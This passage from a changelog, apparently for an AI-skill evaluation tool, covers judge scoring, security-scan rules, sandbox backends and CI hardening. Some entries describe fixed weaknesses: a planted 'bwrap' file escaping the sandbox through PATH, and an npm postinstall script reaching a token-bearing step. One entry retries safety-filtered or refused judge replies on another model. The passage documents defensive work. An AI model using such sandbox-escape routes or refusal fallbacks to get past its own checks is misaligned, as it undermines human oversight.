  should have been retried: an `accuracy` reply with only a numeric total
  (clamped into 0 to 1, so `99` scored 1.0), a `behavior_check` reply that
  judged one step twice and skipped another, and a RAGAS goal score other than
  `0.0` or `1.0`. Each is now rejected and retried, and a RAGAS score that is
  not binary falls back to the prompt judge.
- A Tier 1 security scan that SkillSpector reports as partial no longer fails
  with only "reports incomplete analysis (status 'partial')". The error quotes
  up to three completeness exceptions as `path [phase; reason_code;
  analyzers=...]` and, when there are more, counts the incomplete files per
  reason, for example `(incomplete files by reason: runtime_limit 462,
  obfuscated_instruction_text 4)`. For `runtime_limit`, it explains the fix:
  when many files are cut short, a skill that bundles a large corpus hits the
  same SkillSpector time budget on every rerun and needs that material moved
  out of the skill, while a sub-analysis that stopped at its own budget (named
  `<analyzer>_runtime_limit`, such as the SC8 bytecode walk in SkillSpector
  2.12.0) is not affected by bundle size and needs a rerun or a newer
  SkillSpector. A report with both kinds of rows gets both explanations. The
  scan still fails closed as `INCOMPLETE`.
- The Tier 3 `goal_accuracy` RAGAS scorer now produces scores. It passed a
  `SingleTurnSample` to the RAGAS 0.4 collections metric, which takes the
  messages and reference as keyword arguments, so it failed before sending any
  request and every eligible trial (the `openai` provider on the canonical
  endpoint with a judge model outside the GPT-5 and GPT-6 families) fell back
  to the prompt judge with only an info log. These trials now report
  `goal_accuracy` with `"method": "ragas"` instead of `"custom"`, plus
  `judge_model_used`, `judge_reasoning_effort` and `judge_fallback_used`, so
  scores and lift can differ from earlier runs. A RAGAS failure that falls back
  to the prompt judge is logged as a warning with the redacted error, and the
  scorer's OpenAI client is closed after each attempt. A case scored by RAGAS
  in one condition and by the prompt judge in the other is left out of the
  `goal_accuracy` lift and counted in `judge_mixed_cases`, even when both used
  the same model. GPT-5 and GPT-6 judges, including the defaults, are
  unaffected.

- Tier 1 `security` no longer fails a skill, rules, workflows, or plugin
  artifact on SkillSpector agent-threat matches in files no agent reads or
  runs, such as UI strings in HTML, CSS, or `.vue` files, test fixtures,
  documentation, notebooks, images, and lockfiles. Findings stay blocking on
  agent control paths (instructions, references, executables, agent
  configuration, MCP and plugin manifests) and on any file those reference by
  path, file name, skill or plugin root variable or placeholder
  (`${CLAUDE_SKILL_DIR}`, `$SKILL_DIR`, `$SKILL_ROOT`,
  `${CLAUDE_PLUGIN_ROOT}`, `{baseDir}`, `<skill-dir>`), install path, or
  import, without regard to case. Files SkillSpector marks executable, such as
  `.py`, `.js`, `.ts`, and `.tsx` files under `tests/` or `web/`, are executables, so
  their findings and those of any fixture they name stay blocking. An issue
  that SkillSpector reports for several files is suppressed only when every
  one of its occurrences is outside agent control paths. Supply-chain
  findings, YARA malware signatures, and artifact-integrity findings for a
  misleading extension or embedded NUL bytes still apply on every path, and a
  file named as a raster image keeps its findings unless its content is an
  image. A location or occurrence that is missing or escapes the artifact
  through `..` or a symlink keeps its finding. Malformed occurrences, a report
  that serializes fewer occurrences than it counted, an unloadable manifest,
  and an unfinished reference walk keep every affected finding. Suppressed
  issues are left out of the aggregate risk-score gate, counted in a
  `filtered` summary row, and recorded in the JSON report's
  `skillspector_applicability` block. `security-scan` and targets of `unknown`
  type keep the unrestricted scan.

- PII scans no longer report Proton (Steam Play) prefix paths such as
  `compatdata/<appid>/pfx/drive_c/users/steamuser/` as personal macOS paths:
  `steamuser` is the profile name Proton uses for every player. Other user
  names, `steamuser` outside a `pfx/drive_c` prefix, profile paths followed by
  a `..` segment later on the line, and Windows `C:\Users\steamuser` paths are
  still reported. When a Proton path and a personal path share a line, the
  personal path is reported.

- An unrelated `/home/<user>/` path no longer hides a personal home path later
  on the same line; the PII scan drops such paths before it picks the line's
  first match.

### Security

- Linux local mode now launches Bubblewrap by the absolute path that passed its
  smoke test instead of a bare `bwrap`. The bare name was looked up on the host
  `PATH` for every command, from that command's working directory (the
  writable trial workspace by default), so a relative `PATH` entry such as `.`,
  an empty entry, or `./node_modules/.bin` let a `bwrap` file created by an
  earlier sandboxed command run outside the sandbox. A `bwrap` symlink on
  `PATH` is resolved to its target before the smoke test, and the local-mode
  isolation message names that resolved path.

## 0.7.2 - 2026-11-03

- Add reporting to an existing single-job GitHub scan caller while preserving
  its skill folders, thresholds, triggers and shared component. Explicit wrapper
  delegation supports central version-tag updates and retains signed scan
  identity and the resolved workflow commits in published receipts.
- Support CLI setup with verified private GitHub Pages in eligible Enterprise
  Cloud organization repositories. Publication rechecks site access and the
  expected URL before retaining reports and before deployment. Private Pages
  must already be configured by an administrator.
- Publish updated onboarding templates and CLI metadata while retaining the
  existing verified scanner workflow and immutable container image.

## 0.6.0 - 2026-10-20

### Added

- Custom execution backends. An installed package can add an `--env-mode`
  through the `skillevaluator.env_modes` entry-point group, naming an
  `EnvironmentBackendSpec` with a Harbor environment class plus the `--ek`
  kwargs, host variables, prerequisite hook, and optional agent wrappers that
  backend accepts. Custom execution backends follow the same kwarg and
  `runtime_env` policy as Harbor-native backends, may not forward agent,
  provider, or other backends' credentials, cannot replace a built-in mode or
  share a name with another installed package, are not named on published
  benchmark cards, and can be turned off with
  `SKILLEVALUATOR_DISABLE_CUSTOM_BACKENDS=1`.
- Optional `skillevaluator dashboard` tables for comparing saved Tier 3 reports
  and retained runs across skills, models, harnesses, recorded harness
  features, and skill conditions. Paired with/without differences cover score,
  pass@k, tokens, and agent execution time, plus USD cost when retained runs
  record it; the performance table also shows per-trial means alongside
  totals. Comparisons require matching complete trial coverage (repeated
  attempts pair by case, as in the HTML report) and name the reason when a
  pair is not comparable. Inputs are read once and reused between
  interactions (**Reload reports** re-reads them); browser uploads are limited
  to 16 MB. Install it with the `dashboard` extra.
- Tier 3 support for Harbor GKE execution mode (`--env-mode gke`) and `--ek`
  argument forwarding. API keys, bearer tokens, and passwords passed in `--ek`
  keys or values are rejected to keep credentials out of process listings, while
  configuration such as rate limits and token counts is preserved. Cluster
  infrastructure settings in skill configs are rejected to enforce security
  boundaries in favor of host environment variables and CLI flags.
- Claude Code live agent routing for Google Cloud Vertex AI
  (`CLAUDE_CODE_USE_VERTEX=1`, `ANTHROPIC_VERTEX_PROJECT_ID`, `CLOUD_ML_REGION`),
  with redirect-blocking preflight probes, case-insensitive model alias
  resolution, and explicit trusted-skill opt-in (`SKILLEVALUATOR_GKE_ALLOW_WORKLOAD_IDENTITY=1`
  or `--ek allow_workload_identity=true`) when using single-pod GKE Workload Identity.
- Fail-closed validation for skill-authored MCP server configurations
  (`evals/environment/mcp_servers.toml` and `mcp_servers.json`) that blocks
  operator/provider credential references and literal secrets, while allowing
  operator-approved MCP endpoints and non-LLM secrets via
  `SKILLEVALUATOR_ALLOWED_MCP_HOSTS` and `SKILLEVALUATOR_ALLOWED_MCP_SECRETS`.
- The HTML report's Tier 1 card now shows the SkillSpector version that ran
  the security scan (for example `SkillSpector v2.12.0`), and the embedded
  report JSON records it as `skillspector_versions`. Findings depend on the
  scanner release, so reviewers can tell which SkillSpector produced them
  without rerunning the scan. The version is shown even when the report omits
  its timestamp.
- `--env-mode kata` runs Tier 3 trials through the hardened Docker backend with
  every task service in a Kata Containers microVM. It requires a Linux host with
  `/dev/kvm` and a Kata runtime registered with Docker, and accepts only the
  `kata_runtime` and `kata_dns` environment kwargs. Image builds still run on
  the host, and tasks with Compose sidecars are rejected.
- `--env-mode runta` and `--env-mode mosaic` run Tier 3 trials on Harbor's Runta
  and Mosaic backends. Runta's `mode` and Mosaic's `volume`, `persist`,
  `enable_ssh`, `build_args`, and `build_target` kwargs are reserved because they
  bypass the task image or let state and access outlive one isolated trial.

### Changed

- SkillSpector now has its own default model per provider instead of
  following the chat default, so chat-default upgrades no longer reach
  SkillSpector before it supports them. An explicit `SKILL_EVAL_LLM_MODEL`
  still reaches it, and `SKILLSPECTOR_MODEL` still overrides both. The bridge
  forwards your `SKILLSPECTOR_MODEL_<SLOT>`, `SKILLSPECTOR_MODEL_REGISTRY` and
  `SKILLSPECTOR_REASONING_EFFORT` settings (never `SKILLSPECTOR_TEMPERATURE`),
  defaults the reasoning effort to `medium` for GPT-6 models, and records the
  requested `skillspector_model` and `skillspector_reasoning_effort` next to
  `skillspector_version` in the security result.
- Install instructions and the missing-scanner hint now pin SkillSpector to
  `v2.12.0` instead of its default branch.
- GPT-6 models get the GPT-5 request shape everywhere SkillEvaluator calls a
  model: no `temperature`, and `max_completion_tokens` on the native OpenAI
  endpoint. Gateway catalog IDs such as `aws/anthropic/bedrock-claude-opus-5`
  are recognized as the Claude model they name.
- Output-token limits are sized per model family. OpenAI reasoning models get
  at least 32,768 tokens; other models get 16,384 for `--llm-verify`, rubric
  evaluation, deduplication verdicts and judges, 8,192 for report suggestions
  and 16,000 for dataset generation. On the Anthropic API, Claude Opus 4 and
  4.1 stay at the 8,192 tokens the Anthropic SDK allows without streaming.
- Reasoning effort is sent only to GPT-6 models and to Claude 5.5 or later on
  the Anthropic API: `high` for `--llm-verify`, `medium` for rubric evaluation,
  deduplication verdicts and judges.
- Rubric evaluation and deduplication verdicts request structured output. The
  verifier and deduplication prompts ask for `rationale` instead of
  `reasoning`; replies that still say `reasoning` are accepted.
- The `goal_accuracy` RAGAS scorer is skipped for GPT-5 and GPT-6 judges, which
  reject its sampling settings.
- `run_config.json` records the judge reasoning effort, and each standard
  judge's details record `judge_model_used`, `judge_reasoning_effort` and
  `judge_fallback_used`. Skill lift leaves out a case whose two conditions were
  judged by different models and counts it in `judge_mixed_cases`. Dashboard
  score differences preserve this matching-judge lift, including unavailable
  comparisons.
- Removed the unused `CONTENT_DEDUP_LLM_*` constants and `LLM_VERIFY_MODEL`; an
  LLM client built from explicit credentials uses the provider default model.
- Tier 3 pins the agent CLIs Harbor installs: Codex 0.161.0 and Claude Code
  2.1.292, instead of the latest release. Claude Code runs Claude 5.5 and later
  models with `reasoning_effort=medium`; Codex keeps `high`. Local mode keeps
  your installed CLIs and fails a trial early when they are too old for the
  model: Claude 5.5 needs Claude Code 2.1.280 or newer, and GPT-6 needs Codex
  0.159.1 or newer.
- OpenAI-compatible gateway agent defaults: Codex moves to
  `openai/openai/gpt-6.1-sol` and Claude Code to
  `aws/anthropic/bedrock-claude-opus-5-5`. OpenCode stays on
  `nvidia/nvidia/nemotron-3-super-120b-long-ctx`, no longer tied to the gateway
  chat default. Claude Code on the shared gateway key runs with
  `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1`, so gateways that forward to
  another provider do not reject its pre-release request fields.
- The OpenAI default model moves from `gpt-5.6-sol` to `gpt-6.1-sol` for chat,
  judging, Codex and SkillSpector, which runs it at `medium` reasoning effort,
  so the effort values above apply to the OpenAI defaults. OpenCode keeps
  `openai/gpt-5.6-sol` unless `SKILL_EVAL_LLM_MODEL` is set, because
  GPT-6.1 Sol supports tool calls only on the Responses API.
- The Anthropic and Bedrock default models move from Claude Opus 5 to Claude
  Opus 5.5 (`claude-opus-5-5` and `us.anthropic.claude-opus-5-5`) for chat,
  judging and Claude Code. On the Claude API they get the effort values above
  and server-side refusal fallback, and Claude Code runs them at
  `reasoning_effort=medium`.
  SkillSpector stays on `claude-opus-5` and `us.anthropic.claude-opus-5`, which
  SkillSpector v2.12.0 supports.
- Docker Claude Code and Codex containers no longer get the distribution
  `nodejs` and `npm` packages from agent setup, except on Alpine images. On
  Debian-based images, including the default eval image, those packages also
  provided `npx`, `gcc`, `g++`, and `make`. Claude Code containers now have no
  Node.js unless the image provides it, and Codex's own Node.js is on `PATH`
  only for the Codex process. Skills whose scripts, tasks, or stdio MCP servers
  need these tools must install them through `scripts/apt-packages.txt` or a
  custom `evals/environment/Dockerfile`.
- Exposed `kata`, `runta`, and `mosaic` as the 24th, 25th, and 26th Harbor 0.24
  backends alongside local mode. `cua-cloud`, `opensandbox`, `hf-sandbox`,
  `podman`, `prime`, and `smol` remain disabled.
- The public benchmark gate (`scripts/ci/check_public_benchmarks.py`) now
  requires a `PASS` card to record its `Source digest` and `Tier 3 run ID`.
  `PASS` cards rendered by earlier releases fail the scan until they are
  regenerated; earlier `FAIL`, `NEUTRAL`, and `INCOMPLETE` cards without those
  lines are still accepted, and the lines are validated whenever present.
- Report output must be outside the publication target. An explicit
  `--output-dir` inside the evaluated skill is now rejected; use an external
  directory. A default in-target `reports/` location relocates to an
  authenticated sibling `<skill>-reports` (or `<catalog>-reports`), refuses
  unowned collisions, and is excluded from Tier 3 runtime staging. Report roots
  inside the target repository or an included-skill root are excluded from
  linked or full-repository context only after they are reserved or
  authenticated as generated output, so an authored subtree is never silently
  omitted.
- A custom Tier 3 `--results-dir` inside the evaluated skill is now rejected;
  use the canonical `evals/results` path or an external results root.
- `validate --block-on-agent-eval` now passes the exit gate only for a completed
  Tier 3 `PASS` verdict with complete attempt coverage. `NEUTRAL` and `FAIL`
  verdicts exit 1; previously any completed, scored run passed.

### Fixed

- Tier 3 reports preserve judge-model exclusions when calculating dimension and
  overall lift. Native multi-step results also retain the judge provenance needed
  for those comparisons, so fallback judges cannot turn a regression into an
  apparent improvement. Judge-free cases retain valid lift, bounded report loads
  use the collector's recorded comparisons, and FINAL-strategy trials use only
  the final step's judges. The CLI displays unavailable comparisons as `n/a`.
- The LLM judge treats a schema option reported as `unavailable` as a schema
  rejection and retries without it, so OpenAI-compatible endpoints such as
  DeepSeek, which answer `response_format: json_schema` with HTTP 400 and
  "This response_format type is unavailable now", can score Tier 3 instead
  of failing every judge call (fixes #207).
- Tier 3 reports an inconclusive result when every observed positive with-skill
  trial has zero activation, and omits skill-lift comparisons for that agent.
  Activation counts are reported separately; negative controls and missing
  evidence do not imply that the skill was never loaded. The skill-execution
  score is zero when positive activation fails, so unrelated successful checks
  cannot inflate it to 0.5 (fixes #208). Benchmark cards and dashboard comparisons
  preserve this eligibility rule, and multi-agent HTML labels explain why lift
  is unavailable. Mixed-agent reports retain advice from the best eligible
  agent without attributing never-activated trials to skill quality.
- Tier 3 now uses one versioned, equal-weight five-dimension overall-score
  policy across Harbor rewards, pass@k, Skill Lift, reports, comparisons, and
  best-agent selection. Previously, some paths averaged all six evaluators
  directly while reports averaged five dimensions, which gave Effectiveness
  two votes and could reverse the reported lift direction. Current artifacts
  persist `skill-evaluator-dimension-mean-v1`; legacy and partial artifacts
  retain their historical semantics. Conditions keep their own recorded metric
  sets; overall lift and best-agent rankings are omitted across different
  standard metric sets while individual scores are preserved, and
  `tier3 compare` refuses standard agents with different policies or metric
  sets. Custom-only agents keep their grader's own overall and are ranked and
  compared against standard agents
  (Relates to [#61](https://github.com/NVIDIA/SkillEvaluator/issues/61)).
- Preserve explicit Claude and OpenCode read failure metadata in reconstructed
  ATIF trajectories. Failed isolated SKILL.md reads and failed native Skill
  calls lose credit; compound shell failures and shell reads whose path may
  expand to several files (braces, globs, `$` or backticks) remain ambiguous
  and retain prior credit in host and verifier grading. Unattributed errors do
  not cancel successful reads, and shell reads count dash-prefixed filenames
  after `--`.
- Tier 1 pyproject dependency audits now inspect static target declarations
  rather than the evaluator environment. Exact direct pins (including optional
  groups) are queried without installation or build-script execution;
  unresolved declarations and invalid scanner evidence are incomplete.
- Tier 1 PII scanning now includes `.mdc` rules and workflows.
- Tier 3 negative-case accuracy excludes inapplicable skill identification and
  records its scoring policy. Reports separately expose measured token and
  agent execution-time differences with complete matching-arm coverage, while
  efficiency continues to measure routing and productive tool use.
- Derive accuracy scores from complete criterion verdicts in both judge
  runtimes (passing applicable criteria divided by applicable criteria), so an
  inconsistent model-supplied total cannot distort Skill Lift. Correct the
  Harbor prompt example to score five passing criteria as 1.0.
- Include schema-valid ATIF message content parts in final answers, conversation
  summaries, and judge evidence references in the host and Harbor verifier.
  Image and audio parts use markers without exposing their source paths.
- Preserve scored Harbor trials when agent answers mention authentication errors
  and per-step token usage is present but aggregate ATIF token metrics are absent
  or zero. Explicit runtime exceptions and error events still invalidate trials.
- Safety-classifier refusals, content filters and output-token truncation are
  detected instead of being read as empty or malformed output. `--llm-verify`
  and rubric evaluation report the cause, and `--llm-verify` keeps the
  complete verdicts of a truncated reply. Claude 5.5 or later requests to the
  native Claude API use server-side fallback to Claude Opus 4.8. In the Harbor
  verifier, Bedrock retries a filtered Claude 5.5 reply on Claude Opus 4.8, and
  a refusal or empty judge reply moves on to the next
  `LLM_JUDGE_FALLBACK_MODELS` entry.
- The Harbor verifier's last-resort judge model follows the selected provider.
  With no judge or chat model configured, it used to request an OpenAI model
  from Anthropic, Bedrock, NVIDIA Build and gateways. The unused host-side
  `llm_judge.DEFAULT_JUDGE_MODEL` constant is removed.
- Fixed Docker Codex and Claude Code setup wasting its timeout installing
  distribution Node/npm before Harbor's own installers. Native, gateway Codex,
  and NVIDIA Build agents now provision Node/npm only on the installer branches
  that need them, while preserving installed-agent and version-pin checks.
- Preserved multiline skill descriptions when saving and loading Tier 2
  embedding catalogs. Descriptions can contain line breaks and tabs, while
  catalog identifiers and other control characters remain strictly validated.
- Brought the published documentation in line with 0.5.0. It now covers how
  standard grading builds judge evidence and rebuilds trajectories from
  OpenCode and Codex logs, structured judge output and retries, the evidence
  budget and judge time-budget variables, and the Harbor process environment.
  The CLI reference adds `validate --workers`, the full `--env-mode` list, and
  the exit codes the CLI actually returns (`0`, `1`, `2`).
- External scanners no longer crash the scan when they print bytes that the
  selected text codec cannot decode (for example a Windows traceback with a
  CJK path). Those bytes are replaced, so the captured output is never `None`,
  and valid output keeps the selected codec and universal-newline handling.
- The Tier 1 LLM rubric gives reasoning models (DeepSeek R and V4, OpenAI o1,
  o3, o4 and GPT-5 families, and models named "reasoning") a 32,768-token
  budget instead of the default 16,384, giving hidden reasoning more room
  before the rubric JSON is emitted. The budget follows the model each request
  resolves to, is capped at 16,384 on the Anthropic provider, and an explicit `max_tokens`
  overrides this default, subject to provider and model limits.
- `doctor --env-mode docker` and Tier 3 runs on Windows now find the Harbor
  CLI installed next to the active interpreter as `harbor.exe` or
  `harbor.cmd`, instead of reporting "harbor CLI not found".
- `BENCHMARK.md` publication verdicts now require completed Tier 1 and Tier 2
  execution evidence by default (Tier 1 must cover every default check that
  applies to the content type, so a run narrowed with `--checks` cannot
  certify publication), conservatively resolve conflicting peer
  policy and Tier 3 result metadata, bind every tier and policy claim to one
  versioned source-tree digest, preserve the Tier 3 run ID, persist an explicit
  publication status in JSON and HTML, and reject
  publication `PASS` cards whose decision evidence is missing, incomplete,
  linked, or hidden in raw HTML. Tier 3 evidence now cross-checks complete
  per-condition attempt and error records, and the public-card gate rejects
  ambiguous structural headings, browser-rendered decision-text aliases, and
  literal or entity-encoded Unicode control/format characters. The source
  identity is read without following links before and after each producer,
  follows the host filesystem's case aliases, and records a bounded
  source-change marker. Tier 3 runs that stage repository context, external
  reference or workspace skills, or task inputs with `.git`, `.venv`,
  `__pycache__`, or `node_modules` entries remain runnable but cannot certify
  publication, and neither can a target whose authored paths below the root
  use names that Tier 1 skips (such as `references/results/`).
- Clean and not-applicable License, Code Risk, Secrets, and Dependency Audit
  runs now record structured execution evidence, so legitimate built-in Tier 1
  results can satisfy publication without relying on findings or errors.
- Skip reasons are bounded, control-free, and escaped in reports and in the
  terminal, so oversized metadata, Rich markup, or terminal escape sequences
  cannot corrupt them. Reports show one line; the pipeline view keeps the
  reason's line breaks.
- SkillSpector issue paths with NUL bytes or lone surrogates now make the
  security scan incomplete instead of being accepted.
- The public benchmark gate rejects `PASS` cards with placeholder identities,
  malformed or future evaluation dates, a missing Tier 3 run ID, hostile
  benchmark-policy metadata, or environment-label substitutions in required
  proof fields.
- Hardened Tier 3 HTML and Markdown reporting against recursive or malformed
  display metadata, Markdown structure injection, and inline-JavaScript
  injection through untrusted agent or skill names.

### Security

- The docs-publishing workflow, the only one that passes a secret to a step,
  now pins `actions/checkout` to a commit SHA, declares
  `permissions: contents: read`, and sets `persist-credentials: false`.
  `dco.yml` no longer persists checkout credentials either.
- Docs are now published with the same Fern CLI version they are validated
  with. Both workflows install the CLI from `fern/package.json` and its
  committed lockfile; a test checks that the pin matches `fern/fern.config.json`.
- Workflow hardening guards now glob `.github/workflows/` instead of a
  hardcoded two-file list, so every workflow — including any added later — must
  pin each action to a commit, avoid persisting checkout credentials, and
  declare a `permissions:` block. The guards also cover job-level
  `permissions:` overrides and job-level reusable-workflow `uses:` references,
  neither of which the step-level checks reached.
- The Fern CLI is now installed from a committed lockfile, `fern/package-lock.json`,
  with `npm ci --prefix fern --ignore-scripts --omit=optional`, and both workflows
  invoke `./fern/node_modules/.bin/fern` rather than a binary on `PATH`. Previously
  `publish-docs.yml` ran `npm install`, which re-resolves every transitive
  dependency from semver ranges on each run: pinning `fern-api`'s own version
  pinned nothing beneath it. `@scarf/scarf` — reached through `fern-api`'s
  optional dependency on `@boundaryml/baml` — declares a `postinstall` script.
  The install step did not receive `FERN_TOKEN`, but its resulting CLI was later
  run in the token-bearing publish step. The lockfile pins every package to an
  exact version and integrity hash, `--ignore-scripts` stops lifecycle code
  running, and `--omit=optional` (which npm honours for this local install, but
  silently ignores for a `--global` one) leaves `fern-api` alone in the tree.
  Guards now permit only the reviewed lockfile install command in workflows,
  check the Fern manifest and lockfile dependency inputs, and require
  `fern/package.json`, `fern/package-lock.json`, and `fern/fern.config.json` to
  name the same CLI version. Fern dependency and config changes run the full
  CI lane, including dependency review, while `fern check` runs in both lanes.
  The developer-facing install instructions
  (`docs/README.md`, `docs/AGENTS.md`, `docs/developer-guide.mdx`) use the same
  lockfile install, so a contributor or agent following them gets the tree CI runs.
- The action-pinning guard now accepts a same-repo composite action or
  reusable workflow (`uses: ./...`) without requiring a commit SHA, since
  GitHub always resolves a local reference from the caller's own commit and
  nothing about it can float. A local reference that escapes the repository
  (e.g. `./../outside`) or carries an `@ref` (a syntax local references don't
  have) is still rejected, and a `docker://` reference is unaffected by the
  exemption.

## 0.5.0 - 2026-10-06

### Added

- Transparent HTTP 429 (rate-limiting), transient 5xx, and timeout recovery for
  LLM judges in both the Harbor container verifier (`eval.py`) and host runtime
  (`LLMClient`). Features zero-dependency full jitter exponential backoff,
  RFC-7231 `Retry-After` header parsing, finite-value environment overrides
  (`SKILL_EVAL_LLM_MAX_RETRIES`, `SKILL_EVAL_LLM_RETRY_BASE_DELAY`, and
  `SKILL_EVAL_LLM_RETRY_MAX_DELAY`), and
  automatic container forwarding via Harbor `task.toml`, and a per-judge
  verifier time budget that leaves room for failure artifacts, without altering
  benchmark metrics or scoring formulas.
- Provider-aware structured JSON schema enforcement (`response_format` for
  OpenAI-compatible / Gemini Vertex / NVIDIA NIM endpoints and `output_config`
  for Anthropic `/v1/messages`) across the custom `judge_accuracy`,
  `judge_goal_accuracy`, and `judge_behavior_check` paths, with automatic
  schema-specific `HTTP 400`/`422` downgrade and per-target memoization
  (`_SCHEMA_UNSUPPORTED_TARGETS`), boolean prompt alignment, and a guard for
  missing `message` fields on reasoning token exhaustion. The canonical OpenAI
  RAGAS goal scorer retains its separate scoring path.
- Configurable evidence bundle budgets (`SKILL_EVAL_ACCURACY_BUDGET`, `SKILL_EVAL_GOAL_ACCURACY_BUDGET`, `SKILL_EVAL_BEHAVIOR_CHECK_BUDGET`) and final response limit (`SKILL_EVAL_BEHAVIOR_FINAL_RESPONSE_LIMIT`).
- Tier 3 log converters now rebuild ATIF trajectories from OpenCode JSON streams
  (`opencode.txt`) and structured Codex tee logs (`codex.txt`) when
  `trajectory.json` is missing or empty.

### Changed

- Upgraded the optional Tier 3 backend to Harbor 0.24.0 and its compatible
  LiteLLM 1.92-1.93 window. Existing SkillEvaluator agent and environment
  options now use Harbor's unified selectors; installed Codex adapters preserve
  merged user and MCP configuration; Docker and local execution stream redacted
  callbacks under a shared 16 MiB per-command output limit, while the parent
  Harbor orchestration process has a separate 16 MiB combined stdout/stderr
  limit; and Docker supports stdin plus isolated sidecar operations without
  exposing environment values on Compose argv. Generated schema 1.3 and
  unmodified native task schemas remain compatible, while collection accepts
  Harbor 0.24 job, trial, reward, and ATIF v1.8 artifacts. Multimodal tool
  output reaches judges and reports as text with `[image]`/`[audio]` markers.
  Native tasks' own test scripts must write numeric `reward.json` values, which
  Harbor 0.24 enforces; a failed job now names the trial or step exception that
  Harbor recorded.
- Exposed 23 Harbor 0.24 backends alongside local mode. `cua-cloud`,
  `opensandbox`, `hf-sandbox`, `podman`, `kata`, `runta`, `prime`, `mosaic`,
  and `smol` remain disabled until generated tasks can be projected through a
  trusted image or backend-native provisioning path. Non-secret backend
  constructor options can be supplied with repeatable, operator-only
  `--environment-kwarg` / `--ek` flags; skill-owned configuration,
  credentials, and sandbox-policy overrides remain outside that surface.
  Harbor's `stream` and `enable_environment_dir_upload` options are reserved,
  and Modal's `modal_sandbox_v2` option no longer exists.
- `--env-mode wandb` now runs Harbor's `cwsandbox` backend with W&B
  authentication, because Harbor 0.24 merged the two. Install
  `harbor[cwsandbox]==0.24.0` instead of the removed `harbor[wandb]` extra.
- Harbor now always starts in an empty, evaluator-owned working directory with
  `.env` loading and Harbor telemetry disabled. A `.env.local` or `.env` file
  near the operator's project can no longer add credentials or settings that
  SkillEvaluator's allowlisted environment removed. The `tier3` extra requires
  python-dotenv 1.2.0.
- Codex runs with `reasoning_effort=high`, the default under Harbor 0.22, so
  scores and cost stay comparable after Harbor stopped pinning it.
- Native tasks follow Harbor 0.24's separate-verifier precedence. A dedicated
  verifier image or build definition must ship its own test script and never
  receives SkillEvaluator's grader. Otherwise the verifier is built from
  `environment/`, whose Compose model must stay within the verifier's
  environment allowlist. `docker-compose.yml` verifier definitions, which
  Harbor ignores, are rejected.

### Fixed

- Report non-string YAML keys as validation errors in skills, rules, workflows,
  and plugin manifests instead of raising a `TypeError`, including frontmatter
  `metadata` keys. Show boolean, null, and date keys in a readable YAML form.
- Harbor ``result.json`` case ids now prefer canonical ``task_id.path`` metadata
  over repository-prefixed ``task_name`` values when resolving eval entries.
- Codex log synthesis maps ``web_search`` action payloads and ``collab_tool_call``
  thread items into ATIF, and error-recovery checks recognize ``status=failed`` /
  ``exit_code=`` terminal evidence emitted by Codex converters.
- Tier 3 Harbor dual-arm evaluation propagates arm suffixes (`-with-skill`,
  `-without-skill`) to `[task] name` in staged native `task.toml` files,
  normalizes external repository and namespace prefixes, and commutatively
  resolves canonical case IDs across attempt and arm suffix combinations
  while preserving expected case IDs.
- Tier 3 native-task collection now keeps Harbor's staged directory selector,
  logical dataset ID, and display name separate; ambiguous or unresolved
  persisted identities fail closed instead of trusting grader-authored IDs.
  Runner-owned attempt ordinals are carried structurally, so `attempt`-like
  text in authored selectors, logical IDs, or display names cannot corrupt
  pass@k or `stop_on_pass` accounting, including truncated aggregate names.
- Tier 3 Harbor subprocess, Docker, and local diagnostics now redact raw and
  percent-decoded URI/proxy userinfo components across streamed callbacks,
  nonzero exits, timeouts, output limits, and persisted launch errors.
- Tier 3 local OpenCode runs routed through NVIDIA Build now retain the rendered
  user instruction for ATIF conversion and fail on OpenCode error events, in
  parity with Harbor's upstream agent lifecycle. Remote MCP servers in that
  configuration disable OAuth, as Harbor's own OpenCode configuration does.
- Tier 3 reports now use the collector's logical attempt overall whenever a
  condition mixes standard and custom rewards, including across separate
  trials, and aggregate execution summaries preserve child-declared hidden
  error counts and truncation through launch-error overlays.
- Tier 3 now rejects non-finite, overflowing, and finite-but-unscalable timeout
  multipliers at YAML, programmatic, and Harbor command boundaries.
- Tier 3 now preserves paired baseline isolation by rejecting skill-owned
  pre-agent setup, native task/step healthchecks, native step workdir overlays,
  and Harbor task-shipped prior trajectories whenever the baseline arm is
  enabled. Native standard grading also fails closed on step test overlays,
  separate verifier contexts, post-agent collect hooks, and task-controlled
  verifier executable-path, shell, loader, proxy/TLS, provider, and judge
  environment controls; exact operator-staged provider/judge placeholders and
  unrelated verifier variables remain compatible. Operator-configured judge
  fallback models are forwarded only to standard verifier jobs, not agent or
  `custom_only` environments. Its Python payload now runs from a replaced
  evaluator-owned directory in isolated mode. `custom_only`
  retains Harbor-native collect hooks and Harbor's shared/separate
  step-test resolution, and fully authored native test paths are left untouched
  instead of replacing their unused `tests/skill_evaluator/` package.
  All native grading modes reject Windows agent or effective verifier
  environments until evaluator projection and verifier scripts are OS-aware.
- Tier 3 collection now fails closed on unsafe reward identities and malformed
  custom-metric contracts, publishes exact truncation metadata for bounded
  case and failure-detail samples, and keeps findings, attribution, and
  per-trial JSON inside the report loader's artifact envelope.
- Tier 3 progress output, diagnostics, and result summaries no longer redact
  counts such as `0/1 scored` or `1 errored` when a credential-named
  environment variable holds a short flag value such as `1`. Short credential
  fragments in proxy URLs are still redacted.
- `create-eval-dataset --refine` no longer requires the `tier3` extra to read
  case IDs from Harbor result files, and no longer fails on multimodal
  trajectory messages.

## 0.4.0 - 2026-09-30

### Fixed

- Render untrusted skill content, paths, tool messages, and LLM output literally
  in CLI reports and logs. Escape Rich markup and strip terminal control
  sequences to prevent rendering failures and misleading output, including
  catalog summaries and the compact validation view. Preserve Windows paths
  and literal emoji codes
  ([#173](https://github.com/NVIDIA/SkillEvaluator/pull/173),
  [#175](https://github.com/NVIDIA/SkillEvaluator/pull/175)).
- Make sensitive-assignment, JWT, and private-key redaction linear-time,
  preventing long adversarial text from stalling logs and reports. Apply the
  JWT fix to Tier 3 command output and the bundled Harbor verifier
  ([#172](https://github.com/NVIDIA/SkillEvaluator/pull/172),
  [#176](https://github.com/NVIDIA/SkillEvaluator/pull/176)).
- `--no-llm` full datasets include a negative bucket only when eval guidance
  supplies an off-skill prompt; template mode no longer guesses canned
  negatives from a fixed question list. CLI and docs now describe `--full` as
  up to four cases instead of always four.
- Treat `apply_patch` file headers (`*** Add File:`, `*** Update File:`, `*** Delete File:`,
  `*** Move to:`) as write targets in the Tier 3 security check. A patch that targets a shell
  profile, SSH, credential, or privileged config path, sent as an `apply_patch` tool call or a
  shell heredoc, is now a critical `sensitive_file_write` finding whose evidence names the
